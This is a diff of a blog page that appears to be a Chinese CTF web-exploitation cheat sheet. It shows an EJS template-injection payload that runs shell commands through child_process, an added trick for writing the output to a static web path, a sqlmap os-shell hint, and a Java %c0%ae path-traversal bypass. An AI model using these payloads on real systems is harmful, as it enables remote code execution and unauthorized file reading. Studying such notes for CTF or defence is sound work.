@@ -15,7 +15,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s2.loli.net/2023/12/28/fWlxyDicHbNvFMQ.png">
 <meta property="article:published_time" content="2023-12-28T00:54:41.000Z">
-<meta property="article:modified_time" content="2024-02-26T05:53:47.647Z">
+<meta property="article:modified_time" content="2024-03-06T13:04:15.201Z">
 <meta property="article:author" content="N0zoM1z0">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://s2.loli.net/2023/12/28/fWlxyDicHbNvFMQ.png">
@@ -174,6 +174,7 @@
 <p>虚拟机ubuntu启动(有些库是基于Debian的…)</p>
 <p>-u –os-shell 一把梭</p>
 <h2 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h2><p><code>&lt;%- global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;tac /f*&#39;) %&gt;</code></p>
+<p>如果没有回显 就<code>execSync(&#39;tac /f* &gt;/app/static/flag&#39;)</code> 查看 <code>http://xxxxx:xxx/static/flag</code>即可</p>
 <h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="文件读取漏洞的后利用姿势"><a href="#文件读取漏洞的后利用姿势" class="headerlink" title="文件读取漏洞的后利用姿势"></a>文件读取漏洞的后利用姿势</h2><p>详细: <a href="https://www.freebuf.com/articles/web/337617.html" target="_blank">这篇</a></p>
 <h3 id="Java-c0-ae-安全模式绕过"><a href="#Java-c0-ae-安全模式绕过" class="headerlink" title="Java %c0%ae 安全模式绕过"></a>Java %c0%ae 安全模式绕过</h3><p>在Java端”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII低字符-“.”。通过这个方法可以绕过目录保护读取包配置文件信息</p>
 <h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>参考文章: </p>
